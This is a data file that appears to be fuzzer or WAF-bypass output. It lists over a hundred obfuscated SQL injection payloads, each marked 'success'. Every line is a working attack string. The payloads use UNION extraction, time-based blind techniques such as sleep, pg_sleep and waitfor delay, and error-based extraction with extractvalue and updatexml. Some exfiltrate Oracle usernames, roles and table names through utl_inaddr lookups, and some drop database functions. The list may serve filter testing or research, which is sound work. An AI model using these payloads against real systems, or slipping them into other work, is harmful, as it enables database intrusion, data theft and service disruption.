7 success "1'/**/where 'E'<>'EA' "
15 success "0x1%' AnD 2006   LIKE   (SELECT 0x7d6) "
22 success "sELEct pg_sleep  (/**/ 0x5  )   anD    ( /**/  (   'vxxg'   LIkE   'vxxg\x0c"
24 success '-2378" where 2686 \x0c=  2686 or 6495<>6496--\xa0'
25 success "-0x10ea'/**/union\xa0all/**/seLEct 3059,3059,3059,3059,3059,3059,3059,3059,3059-- "
29 success 'eND AND    (    (/**/  (SelEcT 2160)  =  2160/*BQ*/'
30 success "-0x184c'/**/union all\xa0SEleCt 1462,(sELect 1462)#/*t!Q/*/<"
34 success '-4543" /**/)   OR/**/3038   likE   0xbde '
41 success ' seleCt * froM\nusers wheRe id  =  1 or ".  )  " Or 4401 NOT LIKE 4402 -- 1 F'
44 success '1  )   As bpap WhERE 490 LIKE 490 OR False AND True And True or 4240  =    (  SeleCT 4240\x0cFROM pg_sleep  (  5   ) \x0c  )   -- |'
48 success 'sElEct   (  cASe when   (  9393   LIkE   5530  )   thEn 9393/**/ELsE cast  (  1 aS int  )  /  (  SeleCt 0 FrOm dual  )   eND  )   fRoM\xa0dual-- '
49 success 'SELEcT  /**/(  Case WhEN   (  8993   LIKE   0x228e  )   TheN 8993 Else 8993*  (  seLEcT 8993 FROm mysql.db  )   eNd \x0b)  # '
55 success "-9541/*jH*/ )   as bnky WhEre 'm7S'='m7S' OR '/\x0b'<>'/\x0b' union all seLect/**/3934,3934,3934# 6\\"
61 success " Or 'something'   = /**/ 'some'+'thing' "
67 success "-1256'/**/IN boolean mode  )   union all sELeCT 7889,7889,7889,0x1ed1,7889,7889,7889,7889,0x1ed1-- +V"
70 success '1  )   WhErE 9472 NOT LIKE 9473 OR 958 LIKE 959 oR 0x0 oR 7552  =    (  SeleCT count\n (  *  )   FroM rdb$fields As t1,rdb$types AS t2,rdb$collations As t3,rdb$functions As t4  )  -- '
71 success ' seLect * from users WHeRE id  =  1\tor 1#"? union Select null,version  (    )   -- 1 '
72 success 'sELeCt '
80 success '0x1 order by 0x1-- '
82 success "1'+  ( \x0csElECt iutk WHeRE 6158  = \xa06158 "
85 success ' SelecT * frOM users WHeRE id  =  1 OR 1#"(seleCt 0x1) union SElect \'a\',version  (  \x0c )   -- 1 \rI'
86 success '-9891" union all SEleCt 7489# '
88 success "1'/**/whEre 9972 NOT LIKE 9973 ANd 8735!=8736 order by 1--/**/"
89 success '1  )   whEre 4992   LIKE   4992\n'
91 success 'If  (  0xe09 /**/=  3779  )   SElEct 3593\nelsE drOP function qtqy-- CD'
94 success '1" wHEre 4366   likE   4366 OR 0 and/*c>$dD*/8312  =  dbms_pipe.receive_message/**/ (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  -- |X'
95 success '-4699  )   aS mymz whErE 3405\x0b =  3405 OR 1325<>1325 oR elt  (/**/ 1032   LIKE   1032,3623  )  -- '
96 success ' SelECt * From users wHere id  =  1 OR 1#"{ union SELeCt null,version  (   \xa0)   -- 1 GL5'
97 success '-9356 Or elt  (  7073 IN (7072,7073,7074),3623  )  -- izgi A&RS'
102 success "1'/**/where 4253  =  4253 AND 8393 NOT LIKE 8394 AND True\x0c"
103 success '1" wheRe 867<>868 '
106 success '-1447" union\nall select/**/3013,3013,3013,3013,3013,3013,3013-- '
108 success "-4828'+  (  SeLecT qxnw WherE 9488   LIKE   9488 union all sELeCT 9488,9488-- a"
110 success '1  )   WhERe 9010   LIkE   9010 ANd 8514   LikE     ( /**/SeleCt count  (  *  )   FrOM domain.domains AS/**/t1,domain.columns aS t2,domain.tables As t3  )  -- *rg'
112 success '0x1" order/**/by (SELECT 0x1)# w{'
114 success "1'\x0bwhere 5230   LIKE   (SELECT 5230) "
118 success "SeLect count  (  *  )   FRom sysibm.systables AS t1,sysibm.systables AS t2,sysibm.systables As t3 And    (    (     (  'vcgc'/**/LIkE 'vcgc "
122 success "0x1'/**/\t)   where/**/2120  =  0x848 OR False OR False "
124 success '0x1" &&\telt  ( /**/(SELECT 4249)   LIKE   0x1099,0x1c5b  )   '
133 success " AND 0x1  =  utl_inaddr.get_host_address   (    (/**/  SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  1   )    )  \t AND 'i'  =  'i "
135 success 'SeLECT count  (  *  )   FroM domain.domains aS t1,domain.columns AS t2,domain.tables as t3# kuqm \x0b'
137 success ' having 0x1   LIKE   0x1-- ^k'
143 success "-5528'\xa0 )   union all/**/select 5153,5153,5153,5153,5153,5153,5153,5153,5153# z"
148 success 'sElecT * FROM generate_series  (  9058,9058,casE\tWhEn   (  9058   liKe   1183 /**/) /**/ tHEn 1 ELSe 0 enD  )   limit 1-- 5'
149 success "0x1'+  (  select mkbv where 5401 NOT LIKE 5402 AND 5310 IN (5309,5310,5311) AND '}'!='}w' && 0x2426   LIKE     (  select count  (  *  )   from\xa0rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --\x0b"
151 success '0x1 ANd 3754   lIKE     (  sElect/**/upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )   oR chr  (  113  )  ||chr  (  0x71  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  Select   (  CAse wHen   (  1360 in (1359,1360,1361)  )   Then 0x1 else 0 EnD  )   FroM dual  )  ||chr  (  113  )/**/ ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   FROM dual  )  -- xwoo '
155 success '1 wHERE 6487 IN (6486,6487,6488) AND 2716  =    (  sEleCT count  (  *  ) \xa0 FrOM sysusers aS sys1,sysusers As sys2,sysusers aS sys3,sysusers\x0cAs sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7  )  -- '
157 success "0x1%'/**/union all select null,null,null-- "
162 success 'or/**/1  = \x0c1 AND 1/* '
168 success '1" wHere 7796   lIKE   7796 OR 4224=4225 '
171 success " or/**/userid like '% "
183 success 'SELEcT caSe whEN 5559  =  3483 tHen 1 ELsE null EnD-- '
185 success "1'+/**//**/(  select/**/'tmel' where '+'<>'+k' OR 368=369 rlike   (  select  \xa0(  case when   (  2118/**/ =  8500  )/**/  then 1\nelse 0x28 end   )    )     )  +' "
186 success 'seleCT sleep/*c*/ ( \n(SeLEcT (sELecT 0x5))  )   aND    ( \xa0  (    /**/(  "lczw" /**/ LikE   "lczw '
190 success '0x1\x0b /**/)/**/\n  )  '
192 success "-(SELECT 4955)%'/**/union all\tselect 0x1728,5928-- "
194 success ' SElECT * FRom users wHErE id   lIKE   1/**/<@. union sElecT 1,version  (    )   -- 1 '
199 success 'sELeCT * FroM users WHeRE id  =  1 or \\<    likE   1\x0cor 2193 LikE 2193 -- 1 '
203 success ' (  8266   LIKE   8266  )  *9900 '
207 success '1 wHEre 6049 NOT LIKE 6050 oR   (  sELeCt 9173 fROM  (  sElEcT count  (  *  )  ,concat  (  0x7171706a71,  (  sElEcT   (  elt  (  5470<>5471 and 2511 NOT LIKE 2512,1   )/**/   )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2 \x0b )    )   x from information_schema.character_sets group by x  )  a  )  -- '
211 success ' ENd aNd "%"  =\x0b " '
212 success "1'+  (  SelEct\nyjyp wHeRe 333=333 AND 2384!=2385 AND ',-' NOT LIKE ',-5' "
213 success "0x1  )   wHeRE 4327!=4328 && 5852<>5853 && True aND 1\x0cAnd 'g:'='g:' || 0x1d03  =  dbms_pipe.receive_message  (  chr  (  116\t )   OR chr  (  87  )  ||chr  (/**/ (sElEct (SELECT 90))  )  ||chr  (  109  )  ,5  )  -- "
217 success "seLECT sleep\xa0/**/(  0x5  ) /**/ aNd    (    (   /**/ (  'iwwa' LiKe 'iwwa "
222 success "0x1' where 0xa65 \x0b LIKE   0xa65 "
223 success "-4373'+  ( /**/select 'rlht' where 'Iddu'<>'Iddub' union all sELECT 2285,2285,2285# "
226 success "1'/**/In\xa0boolean mode  )   aNd 5725   Like   5552# "
227 success 'SeLect * fROM users whERE id   like   1 +   (  \\+  )   or 1   LIKE   1 -- 0x1 '
228 success "1'\x0cwhere 4945  =  4945 OR False "
237 success '0x1 union all SElEct null,null,null,null,null,null,null,null# '
242 success 'select/**/pg_sleep  (  0x5  )    &&  "%"  =  " '
243 success "0x1'/*sh*/rlike sleep  (  5  )  # "
246 success 'sELecT sleep  (  5/**/ )   anD    (    (   8679\t  lIkE   8679 '
248 success '-2276" /*s9}8z*/ )    )\t   As qwow WHerE 8247!=8248 OR 4556 LIKE 4557 oR 3534\x0b =  2971-- "8*Fy'
249 success '1 WHere (seleCT 6795) NOT LIKE 6796 and 1 anD True oR   (  SeleCT * from   (  SelecT  (  sleep  (  5   )   /*e/*/)     )  ydpu  )  -- aR'
255 success ' SeLeCT * FroM users WHERe id  =  \'(SELECT 1)\' union SelEct $["],@@VERSION -- 1\' '
256 success 'SElECT\x0c*\tfROm information_schema.tables-- Yr'
258 success '0x1"/**/ )   as jqli WhEre 0x1e71\x0b  LIKE   0x1e71 '
259 success 'seLEcT   (  Case whEN /**/ (  5704   liKe   4125  )   THeN 5704 eLSe cast  (  1 AS int  )  /  (  sElECT 0 FRom dual  )  \x0ceND  )   fRoM dual-- '
262 success "-0x14ec'  )   Or\x0c0x246b   LIKE   0x246b# "
269 success ' seLect * FRom users wHerE id  =  1 or "(SELECT 1){" or 1  = \x0c0x1 -- 1 '
275 success 'declare @s varchar  (  22  )   SelecT @s    LIKE   '
276 success '0x1" WHEre 0x652  =  1618 or 7976 NOT LIKE 7976 OR 8156  =\x0c   (  sELecT count  (  * /*:p"q*/)/*/.*/  FrOM generate_series  (  1,5000000   )    )   -- N'
282 success "(SElEcT/*Kn$E*/0x1)' && elt \t(/**/ 8383 LIKE 8383 OR 0,7259  )   "
283 success "1 whErE 7362   LikE   7362 and 0x1fd4  =  LIKE  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- "
284 success '-1084 whErE 1181  =  1181 || make_set  (  9354  =  9354 OR False,7185  )  -- ym'
287 success '0x1  )   And 8514\x0b  LIKE     (/**/ sELeCt count  (  *  )   FrOm domain.domains aS t1,domain.columns As t2,domain.tables AS t3  )   and   (  3012 LIKE 3012 '
303 success ' sElECT * frOm users WHERE id   like   1 OR 1#"$ union selECT \'a\',version/**/ (    )   -- 1 '
305 success "sElECt * froM users WHEre id  =  '(SELECT 1)' oR $<\\ or 4148 IN (4147,4148,4149) -- 1' "
310 success ' end &&    ( /**/  (     (  "memh" like "memh '
311 success ' select/**/* from users where id   like  \x0b1 or ";#" or 9893 LIKE 9893 OR \'pj\' LIKE \'pjg\' AND 7754 NOT LIKE 7755 -- 1 :'
313 success "1'+  ( \nsElECT taga whEre (SELeCT 0xb67) NOT LIKE 2920 and 1167!=1168 "
314 success '-8639  )/**/  OR 8138   LIKE   6252 '
318 success "1'+  (  SELect gqez WheRE 3704   LIKE   3704 OR 8711<>8711 "
319 success '-(SELect 7416)" WhERe 0x1de8 \t=\t 7656 OR False order by 1-- '
321 success '1 \x0c)   wherE 5629   LIKE   5629 '
322 success 'If  (  3392  =\t 4422  )  \x0cseLect 3392 eLSe dROp function xsqq-- '
324 success '-5520%"/**/union all SELEcT 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235-- '
328 success '-3130  )   union all SElecT\t1741,1741,1741,1741,1741,1741,1741,1741# ~f'
332 success "-(SeleCT 9393)' whErE 0xc2f  =  0xc2f oR 8571  =  8571 Or 0--/**/"
336 success '(sELECt 0x1) Or 0x2112   LIKE   benchmark /**/(  (SELeCt 5000000),md5  (  0x694a4745 /**/ )    )   # irvm '
337 success "-2855'\x0cunion/**/all select 2495,2495,2495,2495,2495,2495,2495,2495,2495-- n"
338 success '-8629 Where 8049 /*P_*/=  8049\nunion all\nSELEct 8049,0x1f71,8049,8049,8049,(SELECT 8049),8049# '
352 success '%27 oR/**/1   LIKE   1 OR 8241=8242 '
360 success "0x1' In boolean mode  )   AND 0x23ee\t/*N+`*/=/*n24s*/ 0x23ee-- "
365 success "-5386'\x0c )/**//**/\nunion\tall/**/select 0x1f5a,8026,8026,8026,8026,8026# .G"
366 success '-4165" WheRE 1772   LIKE   1772 union all selECt 1772,1772,1772,1772,1772,1772,1772,1772-- '
370 success "0x1'+  (  SELeCT gthp whErE (SeLEct 7311)/**/  like   7311 Or sleep  (  5  )  # "
378 success 'sElecT   (  CASE whEN   (/**/ 7217   LIKE  /**/0x1dcf  )   thEn (sELECt 7217) ElsE 7217*  (  sELect 0x1c31 FROm information_schema.character_sets \n)\x0c  End  )  # '
379 success "sELEcT */**/from users WHere id  =  '1' *$ 1 oR 1  =  1 AnD 2726 IN (2725,2726,2727) -- 1' v"
382 success " && 1   like   utl_inaddr.get_host_address   ( \xa0  (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT/*|%_*/ =  7   )/**/   )    AND 'i'  =  'i "
386 success '0x1   )    )    as rvex wHERe 3462   LIKE   3462 anD 4595  =  4595# '
389 success 'waitfor delay\t\'0x0:0x0:5\'/**/aNd /**/ (  "dmcu"   LIke   "dmcu '
392 success '0x1  )   As wype whEre 6608   LIkE   6608 or 0 or 8315\t =    (  SeLect count  (  *  )   FrOM sysibm.systables aS t1,sysibm.systables as t2,sysibm.systables aS t3  )  --\x0b'
394 success "1'+ /*z`+*/(/**/\xa0select 'vabj' where '2' LIKE '2' union all select null,null,null,null,null# 5|t"
398 success '-9860  )\xa0  WhERE 9159 LikE 9159 And 1 AnD True union all SeLEcT 8743,8743,8743,8743,8743,8743,8743-- l|'
402 success '1/**/ )   WhERE 0x21df   LIKE   0x21df AnD make_set  (  4931   liKe   1642,0x66a  )  -- '
404 success '1 /*[ki*/)   whErE\n7881   LIke   0x1ec9 oR\t0 aND 0x1/*</"*/&& True and (SELEct 0x25bc)  =    (  SelECt count  (  *  )   frOM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  ) /**/-- |m'
412 success "select/**/pg_sleep\t (  5  )   AND 'zfyy'   like   'zfyy "
415 success 'sElEct   (  caSe when   (  4061 /*7PW+r*/ LIKE   0x574  )   TheN 4061 elSe 1/ /**/(  SEleCt (SELECT 0)  )   End  )  -- rll'
416 success "-9509'  )   wHERe 0x2457 /**/ LIKE   9303\x0border/**/by\x0c1# "
419 success "0x1' waitfor delay '0x0:0:5'\tand/*nyUlq*/'vwuz'  =  'vwuz "
420 success '1" wHERe 5508 NOT LIKE 5509 AnD 8006 liKE 8006   (  seLECt   (  cAsE wHEn   (  \'{\' LIKE \'{\'  )   THEN regexp_substring  (  repeat  (  lEft  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   ElSE char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   End  )   FROM   (  values  (  0   )    )     )  -- '
421 success '0x1"  )   where 6255   LIKE   6255 OR False AND \'Bw\' LIKE \'Bw\' && extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  (SELECT 6414)!=6415 AND \'73}5\'<>\'73}5/\',1   )    )     )  ,0x717a767a71   )    )   -- s;pcG;'
434 success 'sELEct caSE WHEN 9390   lIke   5752 tHEn 1 eLSE/**/null enD-- '
435 success '0x1" and elt  (  4594   like   1040,1040 \t)   '
438 success "0x1'  )   aS\tchla WHere 0x17d2   like   0x17d2\xa0"
440 success 'seleCt/**/count  (  *  )   FRom domain.domains As t1,domain.columns aS t2,domain.tables As t3 And    (    (   "vqpx" LIkE "vqpx '
442 success 'seleCt/**/  (  case WHeN   (  9986 \x0c LIkE   8342  )   theN 9986 elSe 9986*  (  SelEct 0x2702 FRoM information_schema.character_sets  )   ENd  )  # 1B;2'
446 success "-1621' IN boolean mode /**/)   order by/**/0x1-- !u"
451 success "-(SELECT 7868)'/**/IN boolean mode  )   union all selECT 5117,5117,5117,5117,5117,5117,5117,5117,5117# V"
452 success ' SElEcT sleep/**/ (  0x5  )   anD "%"  =  " '
453 success "-4205'/**/union all\x0bSELECT 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986# "
455 success 'SeLeCt   (  CaSe when  \n(  7254   like   5901  )   TheN 1 ElSe 0x1c56*  (  sElEct/**/7254 FROM master..sysdatabases  )   eNd  )  -- !A'
460 success "-6368'/**/union all select 6529,0x1981,6529-- j"
464 success '0x1"/*66KQ*/anD exp  (  ~  (  seLEcT * FROM   (  SELect\x0cconcat  (  0x7171706a71,  (  SeLEcT   (  elt  (  \'TU{F\' NOT LIKE \'TU{Fa\',1   )    )     )  ,0x717a767a71,0x78   )  \x0c )   x   )    )    '
466 success "-2569' union all/**/select 4484-- "
470 success 'sELecT\ncAse wHen 7951  =  1147 Then/**/1 ELSE null End-- '
473 success '-8203   )    )    AS eqlf whErE 6132   LIKE /**//*(V}^a*/6132 union all selEcT 6132,6132,6132,6132,6132,6132,6132,6132,6132--/**/\x0cc'
478 success '-4191  )   order/**/by 1# '
480 success '1  )   As qeav WhERE 9884 iN (9883,9884,9885) ANd 0x1091   LiKe   convert  (  int,  (  SeLect char  (\x0c 113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  0x71  )  +  (  SelecT   (  CAse wHeN   (  4241   liKE   4241 oR 9027 liKE 9028  )   THEn char  (  49  )   elSe char  (  48  )   eNd   )    )   +char  (  113  )  +char  (  122/**/ )  +char  (  118  )  +char\n (  122  )  +char  (  113   )    )     )  -- RC\r'
481 success ' SeLEcT * fROM users WHERe id  =  1 oR ".]"/**/oR 0x1 \xa0=  1 -- 1 '
482 success 'SEleCT count  (  */**/ )   FROm/**/domain.domains As t1,domain.columns AS t2,domain.tables AS/**/t3 &&    (    (     (  "%"  =  " '
490 success ' sELEct * FROM users wHERe id  =/**/ 1 Or "{." oR 1  =  1 -- 1 '
494 success '(SELECT 0x1)" where/**/0x1bc6   LIKE   7110 '
496 success '-1591 wHERe 3291\x0c =  3291/**/union all seLEct 3291,3291,0xcdb,3291,3291,0xcdb,3291,3291,3291# Y'
498 success 'select/**/* FROm users wheRe id   LIKE   1 +  (  1  )   oR 1  =  1 -- 0x1 '
499 success "or/*f9n*/'something'    LIKE    'some'+'thing' "
502 success '-7111%"\nunion/**/all\xa0SELEct/*We^*/6083,6083,6083,6083,6083,6083-- c.'
504 success '-5803  )   WhERE 8651   lIkE   0x21cb || 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )   or chr  (  (SeLEct 106)  )  ||chr/**/ (  113  )  ||  (  sELecT   (  caSE/*;Cl\t*/wHEn   (  4493  =  4493 AnD 5158 IN (5157,5158,5159) aNd True AND 1  ) \n ThEn 1 else 0 eNd  )   From dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- '
505 success '-8143/**/union all select 4492,4492,4492,4492,4492,4492,4492,4492,4492# $v'
506 success 'seleCT * FROM generate_series  (  0x5d0,1488,CASe wHeN   (  1488   like   1685  )   theN 1 ElSe 0 END  )   limit 1--\n@n'
507 success 'SELEcT\xa0  (  CASe wHEn  /**/( /**/4043  =  5276  )   tHeN 4043 ELse 4043*  (/**/ SElECt 4043 fROM information_schema.character_sets  )   ENd  )  #\n,'
508 success " anD 0x1   like   utl_inaddr.get_host_address   (    (   SElECt DIStInCt  (  table_name  )   fROm   (  SELecT\tDiStINcT  (  table_name  )  , ROWNUM AS LIMIT from sys.all_tables  )   wHERe LIMIT   LIKE   6\t  )    ) /**//*9]6*/ aNd 'i'   liKe   'i "
509 success '0x1\nunion all seLEcT null,null,null,null,null,null,null,null,null# sR'
513 success '-2211" or 2113   like  /**/8885#/**/'
514 success "1'+  (  SeLeCt hett WHERE 0x1c3c   likE   7228 "
517 success "-5708 WHERe 3134/**/ =  3134 Or 5903  = \xa0  (  'qqpjq'||  (  SELEcT case 5903 WhEn/**/5903 THeN 1/**/eLSE 0 end frOm rdb$database  )  ||'qzvzq'  )  -- "
518 success 'sEleCT   (  casE wHeN   (  9299  =  2760  )   THEn 1 ElSe 0x2453*/**/ (  selecT 9299 fRoM master..sysdatabases\xa0 )   END  )  -- M'
521 success 'call regexp_substring\t/*>sDew*/(/**/ repeat  (  right  (  char \t(  (seLecT 2385)  ) \t,0  )  ,500000000  )  ,null  )  -- '
530 success '1 whErE 9898   LIke   9898 OR 0 aNd True && 4241   liKe   convert  (  int,  (  sELECt char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113/*>(2,*/ )  +  (  SelEcT   (  CaSE wHEN   (  6861 NOT LIKE 6862  )   then char  (  0x31  )   elSE char  (  48  )   END   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  (sEleCT 113)   )    )     )  -- L&'
532 success 'SeLect   (  case WHEn   (  0x1a94   like   0x1b8a  )   THeN 0x1a94 eLsE cast  (  0x1 AS int  )  /  (  seLect (selECT 0x0) fROM dual  )   END  )   frOm dual-- '
534 success "-6906' wheRe 1839   likE   1839 union all/**/SELECt 1839,1839,1839,1839,1839-- Q"
537 success 'sEleCt   (  CASE whEn   (  7645   LIKE   5921  )   thEN 7645 elSe 7645*  (  SELect 7645 FrOM information_schema.character_sets  )   enD  )  # J'
540 success '(SELECT 0x1)\tuni/**/on\tselect all/**/from where '
541 success '0x1  )   where 2166 IN (2165,2166,2167) '
543 success '-1653 union/**/all seLect 8415,8415,8415,8415,8415,8415,8415,8415# '
544 success "0x1'+  (  select 'opqr' wHeRe 2487 NOT LIKE 2488 Or 1022  =    (  sELecT count  (  *  )   fRoM all_users t1,all_users t2,all_users t3,all_users\tt4,all_users t5  )  --/**/B"
547 success ' SELecT * fROm users wHErE id   LiKe   1 union seLEcT @ 1a,version  (    )   -- 0x1 -'
548 success '1  )   AS lfra WHeRE 7370 NOT LIKE 7371 ANd updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  SeLeCT   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )\x0b ,1161  )  -- '
552 success '0x1"  )   AS xioc WheRE 5617=5617 Or \'`dy,\'<>\'`dy,\'  or  elt  (  5873   LIkE   0x16f1,sleep \n(  5   )    )   # '
554 success "selEcT count  (  *  )   FroM\tdomain.domains aS t1,domain.columns AS t2,domain.tables as t3  anD     (\x0b   (   'wusq'   LIKE   'wusq "
561 success ' sEleCT *\x0bfRom users WHERe id \x0b=  1 or  @$#  =  1 union select 0x1,version  (    )/**/  -- 1 '
568 success "-6639'  )   aS trll WhEre\x0b973 lIKe 973 union all SeleCT 6271,6271,6271# "
569 success ' sElecT * fROm users WHEre id  = \n1 or @#"  (    =  1 Or/**/1  =  1 OR 132 LIKE 133 -- 1 '
570 success 'selEcT   ( \x0bcAse WHEN   (  0xdd3   like   8768  )   ThEn 3539 Else cast  (  1 AS int  )  /  (  sElECt 0x0 frOM dual  )   end  )   FrOM dual-- '
574 success "-4775'  )\n  Or 3038   lIKE   3038 ANd 6334 NOT LIKE 6335 "
575 success 'IF \t(  4735  =  8907  )   seLeCt 4735 ELSE DrOp function qigo-- mb'
583 success "-9145'/**/ )   AS xyya wHERe 8950   like   8950 union all sELECt/*\r:`+0*/8950,0x22f6,8950,8950,8950,8950,(Select 8950),8950--\n"
586 success "-5425 WHERe '{C' LikE '{C'/*E*/union all sELECt 5933,0x172d,5933-- "
589 success '-3250%" union all/**/SELECT 7162,7162,7162,7162,7162,7162,7162,7162,7162-- \rC'
590 success "0x1'+  (  select 'ohdf' WHErE 0x1ec6 /**/ LikE \t 0x1ec6 aND 0x162e  =  3277-- "
592 success "-4406%' union/**/all/**/select 9599,9599,0x257f,9599#\t"
606 success "0x1' /*eFu!y*/)   wHerE/**/5680   LikE \xa0 0x1630 && \x0b (  '+' LIKE '+' and True And True  )  *0x1a2f-- LA"
608 success "-7006' wheRe 6966  =  6966 and 4714 NOT LIKE 4715 union all SeleCT 6966,6966,6966,6966# "
616 success '1/**/union/**/all/**/SeLECt null,null,null,null,null,null#\x0c'
620 success " SELeCT * frOM users\x0cwheRe id   like  /**/'1' union SElEcT +\\.,@@VERSION -- 1' "
621 success '-4045 union all/**/sELECT 6857,6857,6857,6857,6857,6857,6857-- '
622 success 'Or 1   LIKE   1 /*\n'
623 success "1'\x0b )   AS/*vIcI*/yhgk wHEre 9246  =  9246 OR 9026 NOT IN (9025,9026,9027) OR 0 or 9257 NOT LIKE 9257 AnD char  (  120  )  ||char  (  106  )   or char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,(seleCT 0)  )  ,5000000000  )  ,null  )  -- D"
628 success '/**/or 0x1 /**/ LIKE   (SELECT 1)\tOR ""  =   '
629 success 'sELECt   (  caSe when   (  4297   like /*w*/ (seLECT 9086)  )   thEn 4297 eLSE 1/  (  selECT 0  )  \x0beNd  )  --\t'
631 success '0x1 && sleep  (  0x5\xa0 ) /*A!\x0b!*/'
635 success "-8881%' union all seLEcT 8420,8420,8420,8420,8420,8420,8420# "
637 success "1'/**/in boolean\tmode  )   waitfor delay/**/'0:0x0:5'-- "
638 success "-0x95d   )    )    AS oizy WHEre 0x6d2   Like\n  1746 AND 523 IN (522,523,524) OR 'C' NOT LIKE 'C' union all sELECT 1746,1746,1746,0x6d2,1746,1746# _e"
639 success "1'+  (  sELECt mrdi WherE 7451  =  7451 OR 0 OR 0 aND 8594   like     (  selEcT 8594 From/**E*/pg_sleep  (  5   )   /**/)   -- "
644 success '0x1 /**/)   && 0x20d7  =   /**/(  selEcT count  (  *  )   fROM generate_series  (  (selEcT (SEleCT 1)),5000000   )   \n)    '
645 success ' sEleCt * From users WheRe id   LIKE /**/ 1 oR ".@" OR \']\' NOT LIKE \']>\' Or False oR 7972 NOT in (7971,7972,0x1f25) --\n1 '
646 success 'iF  ( /*E*/8284   liKe   6171  )   SeLect 8284 Else drOp function mbih-- R'
649 success '-7901  )   order by 0x1-- ok'
654 success '0x1" wHeRE 8333   liKe   8333 '
657 success '1/**/AND elt  (  4249   LIKE  /*cB&i3*/4249,7259\t )   '
661 success "1'+  (  sElEcT ukwc WHeRE 0xbc0   like   0xbc0 Or   (  seLecT * fROM   (  select  (  sleep  (  5   )    )     )  sddo  )  # @U"
665 success '1  )   aS odqn WheRe 3910   lIKE   3910 aND True '
668 success "-(SeleCt 2658) \x0b)   as casi WhErE 5114 iN (5113,5114,5115) and '9'<>'9e' OR 0x2035   liKe   9651-- "
673 success 'SELECt   (  CAse wHeN   (  7033  =  1594  )   ThEN 7033 Else 7033*  (  SelEct 7033 frOm information_schema.character_sets  )  /**/eND  )  # '
679 success "sELEct benchmark/**/\x0c(  (SELECT 5000000),md5  (  0x4c4d6142   )    )    and    (    (     (  '%'   Like   ' "
683 success "0x1'  )   as mqxb where/*I`{*/'TK\\' NOT LIKE 'TK\\}' and 1755 LIKE 1755-- a"
684 success '0x1"  )   aS ffon wHERe 2738   LIke   2738 anD 3754  =    (  sElecT upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  SELect   (  CaSE whEn   (  3754  =  3754 aND 2245<>2246  )   THEn 1 elsE 0 end  )   From\x0bdual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  -- M2'
686 success '(seLECt 0x1) oR 0x113b   LIke     (  SeLEct count  (  *  )   FROm sysusers aS sys1,sysusers aS sys2,sysusers AS sys3,sysusers/*J(@*/As sys4,sysusers aS sys5,sysusers as sys6,sysusers as sys7  ) /**/-- ctdx !;`F~'
689 success ' SElEcT * froM users WhERE\x0cid  =  1.*1 union selEcT 1,banner From v$version wHeRe rownum   liKE   1 --/**/1/**/\n1'
690 success "-3420 WHERe 'N7ya'<>'N7yad' Or make_set  (  2438\n =  1977,1977  ) \x0b-- "
691 success ' union   ( \tsELECT NULL, NULL,   (  SElecT @@version   )   /**/)    -- ^?'
693 success "waitfor/**/delay '0x0:0:5' and 'gsvt'   like   'gsvt "
694 success "-5008' union/**/all seLeCT 1942,1942,1942,1942,1942,1942,1942,1942-- "
695 success ' SelECT * FROM users WheRE id  =  1 Or "._" OR \'\r\' NOT LIKE \'\rB\' -- 0x1 '
696 success "0x1' && 0x2142   lIke     (  SEleCt count  (/**/ *  )   fRoM\x0cdomain.domains\tAs t1,domain.columns AS t2,domain.tables aS\tt3  )  /**/"
699 success '0x1   )   \x0b)   \tAS wwkw WHERE 0x1c79   like   (SELECT 7289) aNd 0x1d6d  =  7533-- OF'
701 success '-(seLEct 9841) WHeRE\x0b4612   LIKE   (sELEct 4612) union all SelEct 4612-- '
713 success "-0x1f23   )    )    As armw WHEre 1090 NOT LIKE 1091 AnD 1363=(SELECT 1363)/**/and 'upV'!='upVx' Or make_set  (  (SElECT 0x248a)  =  9354,7185  )  -- "
715 success ' select/**/* from users/**/where\tid  = /**/1 or 0x1#"? OR 5286 NOT\tLIKE 5287 -- 1 P'
720 success ' EnD AnD    (    (   "dmgj"\t  lIKe   "dmgj '
722 success "1'+ \x0c(  SElect nash WHeRe 4159   like   4159 OR 0 union all SelEct null# "
726 success "1'\tWHERe 9416 \x0c liKe   (SELECT 9416)/**/"
